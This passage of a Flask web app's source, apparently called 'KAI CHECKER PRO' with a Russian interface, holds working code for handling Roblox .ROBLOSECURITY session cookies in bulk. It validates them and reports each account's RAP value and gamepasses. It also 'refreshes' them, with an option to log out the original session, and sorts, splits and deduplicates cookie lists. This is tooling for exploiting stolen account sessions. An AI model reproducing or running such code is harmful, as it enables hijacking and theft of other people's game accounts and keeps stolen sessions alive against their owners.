                <span class="errors">⚠️ Errors: <strong id="freshErrorsCount">0</strong></span>
            </div>
            <div id="freshResultWrapper" style="display:none; margin-top:16px;">
                <div class="cookie-output">
                    <code id="freshResultCode"></code>
                    <button class="copy-btn" id="freshCopyBtn">📋 Копировать</button>
                </div>
            </div>
            <div class="fresh-history">
                <h3>📜 Mass Refresher History</h3>
                <div class="history-list" id="freshHistoryList">
                    <div style="color:#4a3a6a; font-size:13px; padding:8px;">История пуста</div>
                </div>
                <button class="btn btn-secondary" onclick="clearFreshHistory()" style="margin-top:10px; padding:6px 16px; font-size:12px;">🗑️ Очистить</button>
            </div>
        </div>
    </div>

    <!-- ========================================================== -->
    <!-- ===== ВАЛИДАТОР ========================================== -->
    <!-- ========================================================== -->
    <div class="tab-content" id="tab-validator">
        <div class="card">
            <h2>✅ Валидатор (отсев мёртвых)</h2>
            <div class="upload-area" id="validatorArea" onclick="document.getElementById('validatorFile').click()">
                <p>📁 <strong>Загрузить .txt</strong></p>
            </div>
            <input type="file" id="validatorFile" accept=".txt" style="display:none;">
            <button class="btn btn-primary" onclick="runValidator()" style="margin-top:14px;">🧪 Запустить</button>
            <div class="result-box" id="validatorResult"></div>
        </div>
    </div>

    <!-- ========================================================== -->
    <!-- ===== ИНСТРУМЕНТЫ ======================================== -->
    <!-- ========================================================== -->
    <div class="tab-content" id="tab-tools">
        <div class="card">
            <h2>📂 Сортер (по одному)</h2>
            <div class="upload-area" id="sorterArea" onclick="document.getElementById('sorterFile').click()">
                <p>📁 <strong>Загрузить .txt</strong></p>
            </div>
            <input type="file" id="sorterFile" accept=".txt" style="display:none;">
            <button class="btn btn-primary" onclick="runSorter()">📦 Сортировать</button>
            <div class="result-box" id="sorterResult"></div>
        </div>
        <div class="card">
            <h2>✂️ Разделитель (на 5 частей)</h2>
            <div class="upload-area" id="splitArea" onclick="document.getElementById('splitFile').click()">
                <p>📁 <strong>Загрузить .txt</strong></p>
            </div>
            <input type="file" id="splitFile" accept=".txt" style="display:none;">
            <button class="btn btn-primary" onclick="runSplit()">✂️ Разделить</button>
            <div class="result-box" id="splitResult"></div>
        </div>
        <div class="card">
            <h2>📦 Слияние (удаление дублей)</h2>
            <div class="upload-area" id="mergeArea" onclick="document.getElementById('mergeFile').click()">
                <p>📁 <strong>Загрузить несколько .txt</strong></p>
            </div>
            <input type="file" id="mergeFile" accept=".txt" multiple style="display:none;">
            <button class="btn btn-primary" onclick="runMerge()">🔗 Слить</button>
            <div class="result-box" id="mergeResult"></div>
        </div>
    </div>

    <div class="footer">KAI CHECKER · PRO · Фрешер в стиле rblxrefresh</div>
</div>

<!-- ========================================================== -->
<!-- ===== JAVASCRIPT ========================================= -->
<!-- ========================================================== -->
<script>
    // ===== ВКЛАДКИ =====
    document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', function() {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            this.classList.add('active');
            document.getElementById('tab-' + this.dataset.tab).classList.add('active');
        });
    });

    // ===== DRAG & DROP =====
    document.querySelectorAll('.upload-area').forEach(area => {
        area.addEventListener('dragover', e => { e.preventDefault(); area.classList.add('drag-active'); });
        area.addEventListener('dragleave', () => area.classList.remove('drag-active'));
        area.addEventListener('drop', e => {
            e.preventDefault();
            area.classList.remove('drag-active');
            const input = area.parentElement.querySelector('input[type="file"]');
            if (input) { input.files = e.dataTransfer.files; input.dispatchEvent(new Event('change')); }
        });
    });

    // ============================================================
    // ===== ЧЕКЕР ================================================
    // ============================================================
    async function runFullcheck() {
        const resBox = document.getElementById('fullcheckResult');
        const manual = document.getElementById('manualCookies').value.trim();
        const fileInput = document.getElementById('fullFile');
        const progress = document.getElementById('checkerProgress');
        
        if (!manual && !fileInput.files.length) {
            resBox.className = 'result-box error';
            resBox.textContent = '❌ Вставь куки или загрузи .txt!';
            return;
        }

        const formData = new FormData();
        if (manual) {
            const blob = new Blob([manual], { type: 'text/plain' });
            formData.append('file', blob, 'manual.txt');
        } else if (fileInput.files.length) {
            formData.append('file', fileInput.files[0]);
        }

        resBox.textContent = '⏳ Проверка...';
        resBox.className = 'result-box';
        progress.style.width = '30%';
        
        try {
            const response = await fetch('/api/fullcheck', { method: 'POST', body: formData });
            progress.style.width = '70%';
            
            const contentType = response.headers.get('content-type');
            if (!contentType || !contentType.includes('application/json')) {
                const text = await response.text();
                resBox.className = 'result-box error';
                resBox.textContent = '❌ Ошибка сервера. Проверь Flask.';
                progress.style.width = '0%';
                return;
            }
            const data = await response.json();
            progress.style.width = '100%';
            setTimeout(() => { progress.style.width = '0%'; }, 1000);
            
            if (data.success) {
                resBox.className = 'result-box success';
                let html = `✅ Проверено: ${data.total || 0}\n📦 Геймпассов: ${data.total_gamepasses || 0}\n💎 RAP: ${data.total_rap || 0}\n\n`;
                if (data.reports && data.reports.length) {
                    html += `<b>📋 ОТЧЁТЫ:</b>\n`;
                    for (const report of data.reports) {
                        html += `\n${report}\n─────────────────\n`;
                    }
                }
                if (data.download_url) {
                    html += `\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать ZIP</a>`;
                }
                resBox.innerHTML = html;
                saveCheckerHistory(data.total || 0, data.total_gamepasses || 0, data.total_rap || 0);
            } else {
                resBox.className = 'result-box error';
                resBox.textContent = '❌ ' + (data.message || 'Ошибка');
            }
        } catch (e) {
            resBox.className = 'result-box error';
            resBox.textContent = '❌ Ошибка: ' + e.message;
            progress.style.width = '0%';
        }
    }

    // ===== ИСТОРИЯ ЧЕКЕРА =====
    function saveCheckerHistory(total, gamepasses, rap) {
        const history = JSON.parse(localStorage.getItem('checkerHistory') || '[]');
        history.unshift({ date: new Date().toLocaleString(), total, gamepasses, rap });
        if (history.length > 20) history.pop();
        localStorage.setItem('checkerHistory', JSON.stringify(history));
        renderCheckerHistory();
    }

    function renderCheckerHistory() {
        const container = document.getElementById('checkerHistoryContainer');
        const list = document.getElementById('checkerHistoryList');
        const history = JSON.parse(localStorage.getItem('checkerHistory') || '[]');
        if (history.length === 0) { container.style.display = 'none'; return; }
        container.style.display = 'block';
        list.innerHTML = history.map(item => `
            <div style="display:flex; justify-content:space-between; padding:6px 12px; background:rgba(13,7,34,0.6); border-radius:8px; font-size:13px; color:#b0b0c8; border-left:3px solid #a855f7;">
                <span>📊 ${item.total} куков | 🎮 ${item.gamepasses} гп | 💎 ${item.rap} RAP</span>
                <span style="color:#4a3a6a; font-size:12px;">${item.date}</span>
            </div>
        `).join('');
    }

    function clearCheckerHistory() {
        localStorage.removeItem('checkerHistory');
        renderCheckerHistory();
    }

    // ============================================================
    // ===== ФРЕШЕР ===============================================
    // ============================================================
    let freshMethod = 'ticket';
    let freshRunning = false;
    let freshAbort = false;

    function setFreshMethod(method) {
        freshMethod = method;
        document.querySelectorAll('.method-btn').forEach(b => b.classList.remove('active'));
        if (method === 'ticket') document.getElementById('ticketMethod').classList.add('active');
        else document.getElementById('logoutMethod').classList.add('active');
    }

    async function startFresh() {
        const input = document.getElementById('freshInput');
        const status = document.getElementById('freshStatus');
        const startBtn = document.getElementById('freshStartBtn');
        const stopBtn = document.getElementById('freshStopBtn');
        const progressFill = document.getElementById('freshProgressFill');
        const progressText = document.getElementById('freshProgressText');
        const validCount = document.getElementById('freshValidCount');
        const invalidCount = document.getElementById('freshInvalidCount');
        const errorsCount = document.getElementById('freshErrorsCount');
        const resultWrapper = document.getElementById('freshResultWrapper');
        const resultCode = document.getElementById('freshResultCode');
        
        const cookies = input.value.trim().split('\n').filter(c => c.trim().length > 50);
        if (!cookies.length) {
            status.textContent = '❌ Нет куков для обновления';
            return;
        }
        
        if (freshRunning) return;
        freshRunning = true;
        freshAbort = false;
        startBtn.disabled = true;
        stopBtn.disabled = false;
        status.textContent = '⏳ Работаем...';
        progressFill.style.width = '0%';
        progressText.textContent = '0%';
        validCount.textContent = '0';
        invalidCount.textContent = '0';
        errorsCount.textContent = '0';
        resultWrapper.style.display = 'none';
        
        let valid = 0, invalid = 0, errors = 0;
        let newCookies = [];
        
        for (let i = 0; i < cookies.length; i++) {
            if (freshAbort) {
                status.textContent = '⏹️ Остановлено';
                break;
            }
            const c = cookies[i].trim();
            const progress = Math.round(((i + 1) / cookies.length) * 100);
            progressFill.style.width = progress + '%';
            progressText.textContent = progress + '%';
            
            try {
                const r = await fetch('/api/fresh', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cookie: c, kill_old: freshMethod === 'logout' })
                });
                const data = await r.json();
                if (data.success && data.new_cookie) {
                    valid++;
                    newCookies.push(data.new_cookie);
                    validCount.textContent = valid;
                } else {
                    invalid++;
                    invalidCount.textContent = invalid;
                }
            } catch (e) {
                errors++;
                errorsCount.textContent = errors;
            }
            await new Promise(r => setTimeout(r, 200));
        }
        
        freshRunning = false;
        startBtn.disabled = false;
        stopBtn.disabled = true;
        status.textContent = '✅ Готово';
        progressFill.style.width = '100%';
        progressText.textContent = '100%';
        
        if (newCookies.length) {
            resultCode.textContent = newCookies.join('\n');
            resultWrapper.style.display = 'flex';
            document.getElementById('freshCopyBtn').onclick = function() {
                navigator.clipboard.writeText(newCookies.join('\n')).then(() => {
                    this.textContent = '✅ Скопировано!';
                    setTimeout(() => { this.textContent = '📋 Копировать'; }, 2000);
                });
            };
            saveFreshHistory(newCookies.length, valid, invalid, errors);
        }
    }

    function stopFresh() {
        freshAbort = true;
        document.getElementById('freshStatus').textContent = '⏹️ Останавливаем...';
    }

    function downloadFreshResults() {
        const code = document.getElementById('freshResultCode');
        if (!code.textContent) return;
        const blob = new Blob([code.textContent], { type: 'text/plain' });
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = `refreshed_cookies_${new Date().toISOString().slice(0,10)}.txt`;
        a.click();
    }

    // ===== ИСТОРИЯ ФРЕШЕЙ =====
    function saveFreshHistory(total, valid, invalid, errors) {
        const history = JSON.parse(localStorage.getItem('freshHistory') || '[]');
        history.unshift({ date: new Date().toLocaleString(), total, valid, invalid, errors, method: freshMethod });
        if (history.length > 30) history.pop();
        localStorage.setItem('freshHistory', JSON.stringify(history));
        renderFreshHistory();
    }

    function renderFreshHistory() {
        const list = document.getElementById('freshHistoryList');
        const history = JSON.parse(localStorage.getItem('freshHistory') || '[]');
        if (history.length === 0) {
            list.innerHTML = '<div style="color:#4a3a6a; font-size:13px; padding:8px;">История пуста</div>';
            return;
        }
        list.innerHTML = history.map(item => `
            <div class="history-item">
                <span>🔄 ${item.total} обновлено</span>
                <span class="ok">✅ ${item.valid}</span>
                <span class="fail">❌ ${item.invalid}</span>
                <span style="color:#feca57;">⚠️ ${item.errors}</span>
                <span style="font-size:11px; color:#4a3a6a;">${item.method === 'ticket' ? 'Ticket' : 'Logout'}</span>
                <span class="time">${item.date}</span>
            </div>
        `).join('');
    }

    function clearFreshHistory() {
        localStorage.removeItem('freshHistory');
        renderFreshHistory();
    }

    // ============================================================
    // ===== ВАЛИДАТОР ============================================
    // ============================================================
    async function runValidator() {
        const fileInput = document.getElementById('validatorFile');
        const resBox = document.getElementById('validatorResult');
        if (!fileInput.files.length) { alert('Загрузи .txt!'); return; }
        const formData = new FormData();
        formData.append('file', fileInput.files[0]);
        resBox.textContent = '⏳ Валидация...';
        resBox.className = 'result-box';
        try {
            const r = await fetch('/api/validate', { method: 'POST', body: formData });
            const data = await r.json();
            if (data.success) {
                resBox.className = 'result-box success';
                let html = `✅ Валидных: ${data.valid}\n❌ Невалидных: ${data.invalid}\n📊 Всего: ${data.total}`;
                if (data.download_url) {
                    html += `\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать валидные</a>`;
                }
                resBox.innerHTML = html;
            } else {
                resBox.className = 'result-box error';
                resBox.textContent = '❌ ' + data.message;
            }
        } catch (e) {
            resBox.className = 'result-box error';
            resBox.textContent = '❌ Ошибка: ' + e.message;
        }
    }

    // ============================================================
    // ===== СОРТЕР ===============================================
    // ============================================================
    async function runSorter() {
        const fileInput = document.getElementById('sorterFile');
        const resBox = document.getElementById('sorterResult');
        if (!fileInput.files.length) { alert('Загрузи .txt!'); return; }
        const formData = new FormData();
        formData.append('file', fileInput.files[0]);
        resBox.textContent = '⏳ Сортировка...';
        resBox.className = 'result-box';
        try {
            const r = await fetch('/api/sorter', { method: 'POST', body: formData });
            const data = await r.json();
            if (data.success) {
                resBox.className = 'result-box success';
                let html = `✅ Сортировка завершена!\n📦 Куков: ${data.total}`;
                if (data.download_url) {
                    html += `\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать ZIP</a>`;
                }
                resBox.innerHTML = html;
            } else {
                resBox.className = 'result-box error';
                resBox.textContent = '❌ ' + data.message;
            }
        } catch (e) {
            resBox.className = 'result-box error';
            resBox.textContent = '❌ Ошибка: ' + e.message;
        }
    }

    // ============================================================
    // ===== РАЗДЕЛИТЕЛЬ ==========================================
    // ============================================================
    async function runSplit() {
        const fileInput = document.getElementById('splitFile');
        const resBox = document.getElementById('splitResult');
        if (!fileInput.files.length) { alert('Загрузи .txt!'); return; }
        const formData = new FormData();
        formData.append('file', fileInput.files[0]);
        resBox.textContent = '⏳ Разделение...';
        resBox.className = 'result-box';
        try {
            const r = await fetch('/api/split', { method: 'POST', body: formData });
            const data = await r.json();
            if (data.success) {
                resBox.className = 'result-box success';
                let html = `✅ Разделение завершено!\n📦 Куков: ${data.total}`;
                if (data.download_url) {
                    html += `\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать ZIP</a>`;
                }
                resBox.innerHTML = html;
            } else {
                resBox.className = 'result-box error';
                resBox.textContent = '❌ ' + data.message;
            }
        } catch (e) {
            resBox.className = 'result-box error';
            resBox.textContent = '❌ Ошибка: ' + e.message;
        }
    }

    // ============================================================
    // ===== СЛИЯНИЕ ==============================================
    // ============================================================
    async function runMerge() {
        const fileInput = document.getElementById('mergeFile');
        const resBox = document.getElementById('mergeResult');
        if (fileInput.files.length < 2) { alert('Выбери минимум 2 файла!'); return; }
        const formData = new FormData();
        for (let f of fileInput.files) formData.append('files', f);
        resBox.textContent = '⏳ Слияние...';
        resBox.className = 'result-box';
        try {
            const r = await fetch('/api/merge', { method: 'POST', body: formData });
            const data = await r.json();
            if (data.success) {
                resBox.className = 'result-box success';
                let html = `✅ Слияние завершено!\n📦 Куков: ${data.total}\n🔄 Дублей удалено: ${data.duplicates}`;
                if (data.download_url) {
                    html += `\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать</a>`;
                }
                resBox.innerHTML = html;
            } else {
                resBox.className = 'result-box error';
                resBox.textContent = '❌ ' + data.message;
            }
        } catch (e) {
            resBox.className = 'result-box error';
            resBox.textContent = '❌ Ошибка: ' + e.message;
        }
    }

    // ===== ИНИЦИАЛИЗАЦИЯ =====
    renderCheckerHistory();
    renderFreshHistory();
</script>
</body>
</html>"""

# ============================================================
# API
# ============================================================

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api/fullcheck", methods=["POST"])
def api_fullcheck():
    if 'file' not in request.files:
        return jsonify({"success": False, "message": "Файл не найден"})
    file = request.files['file']
    content = file.read().decode('utf-8', errors='ignore')
    cookies = [line.strip() for line in content.split('\n') if '.ROBLOSECURITY' in line and len(line) > 50]
    if not cookies:
        return jsonify({"success": False, "message": "Куки не найдены"})
    reports = []
    total_rap = 0
    total_gamepasses = 0
    for c in cookies[:10]:
        info = get_full_info(c)
        if info['status'] == '✅':
            reports.append(format_short_report(info))
            total_rap += info.get('TotalRAP', 0)
            total_gamepasses += len(info.get('PurchasedGamepasses', {}))
    return jsonify({
        "success": True,
        "total": len(cookies),
        "total_rap": total_rap,
        "total_gamepasses": total_gamepasses,
        "reports": reports
    })

@app.route("/api/fresh", methods=["POST"])
def api_fresh():
    data = request.json
    cookie = data.get('cookie', '')
    kill_old = data.get('kill_old', True)
    ok, new_cookie, log_text = refresh_cookie_sync(cookie, kill_old)
    return jsonify({"success": ok, "new_cookie": new_cookie, "log": log_text})

@app.route("/api/validate", methods=["POST"])
def api_validate():
    content = request.files['file'].read().decode('utf-8', errors='ignore')
    cookies = [line.strip() for line in content.split('\n') if '.ROBLOSECURITY' in line and len(line) > 50]
    valid, invalid = [], []
    for c in cookies[:20]:
        if get_full_info(c)['status'] == '✅':
            valid.append(c)
        else:
            invalid.append(c)
    if valid:
        filename = f"valid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(f"downloads/{filename}", 'w', encoding='utf-8') as f:
            f.write('\n'.join(valid))
        return jsonify({
            "success": True,
            "total": len(cookies),
            "valid": len(valid),
            "invalid": len(invalid),
            "download_url": f"/downloads/{filename}"
        })
    return jsonify({"success": True, "total": len(cookies), "valid": 0, "invalid": len(invalid)})

@app.route("/api/sorter", methods=["POST"])
def api_sorter():
    content = request.files['file'].read().decode('utf-8', errors='ignore')
    cookies = [line.strip() for line in content.split('\n') if '.ROBLOSECURITY' in line and len(line) > 50]
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for i, c in enumerate(cookies[:50]):
            zf.writestr(f"cookie_{i+1}.txt", c)
    zip_buffer.seek(0)
    filename = f"sorted_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
    with open(f"downloads/{filename}", 'wb') as f:
        f.write(zip_buffer.getvalue())
    return jsonify({"success": True, "total": len(cookies), "download_url": f"/downloads/{filename}"})

@app.route("/api/split", methods=["POST"])
def api_split():
    content = request.files['file'].read().decode('utf-8', errors='ignore')
    cookies = [line.strip() for line in content.split('\n') if '.ROBLOSECURITY' in line and len(line) > 50]
    chunk_size = max(1, len(cookies) // 5)
    chunks = [cookies[i:i+chunk_size] for i in range(0, len(cookies), chunk_size)]
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for i, chunk in enumerate(chunks[:5]):
            zf.writestr(f"part_{i+1}.txt", '\n'.join(chunk))
    zip_buffer.seek(0)
    filename = f"split_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
    with open(f"downloads/{filename}", 'wb') as f:
        f.write(zip_buffer.getvalue())
    return jsonify({"success": True, "total": len(cookies), "download_url": f"/downloads/{filename}"})

@app.route("/api/merge", methods=["POST"])
def api_merge():
    all_cookies = []
    for f in request.files.getlist('files'):
        content = f.read().decode('utf-8', errors='ignore')
        all_cookies.extend([line.strip() for line in content.split('\n') if '.ROBLOSECURITY' in line and len(line) > 50])
    unique = list(dict.fromkeys(all_cookies))
    filename = f"merged_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(f"downloads/{filename}", 'w', encoding='utf-8') as f:
        f.write('\n'.join(unique))
    return jsonify({
        "success": True,
        "total": len(unique),
        "duplicates": len(all_cookies)-len(unique),
        "download_url": f"/downloads/{filename}"
    })

@app.route("/downloads/<filename>")
def download_file(filename):
    return send_from_directory("downloads", filename, as_attachment=True)

if __name__ == "__main__":
    app.run(debug=True, port=5000)
